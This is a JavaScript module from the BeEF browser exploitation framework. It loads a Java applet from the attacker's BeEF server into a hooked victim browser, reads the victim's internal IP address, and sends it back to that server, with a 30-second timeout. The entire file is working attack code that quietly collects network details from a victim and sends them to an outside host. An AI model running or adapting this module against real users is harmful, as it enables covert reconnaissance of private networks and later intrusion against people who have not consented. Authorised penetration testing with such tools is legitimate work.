//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

    var applet_uri = 'http://'+beef.net.host+ ':' + beef.net.port + '/';
	var internal_counter = 0;
	var timeout = 30;
    var output;
    beef.dom.attachApplet('get_internal_ip', 'get_internal_ip', 'get_internal_ip' ,
        applet_uri, null, null);

    function waituntilok() {
        try {
            output = document.get_internal_ip.ip();
            beef.net.send('<%= @command_url %>', <%= @command_id %>, output);
				beef.dom.detachApplet('get_internal_ip');
				return;
			} catch (e) {
				internal_counter++;
				if (internal_counter > timeout) {
					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Timeout after '+timeout+' seconds');
					beef.dom.detachApplet('get_internal_ip');
					return;
				}
				setTimeout(function() {waituntilok()},1000);
			}
	}

	setTimeout(function() {waituntilok()},5000);

});
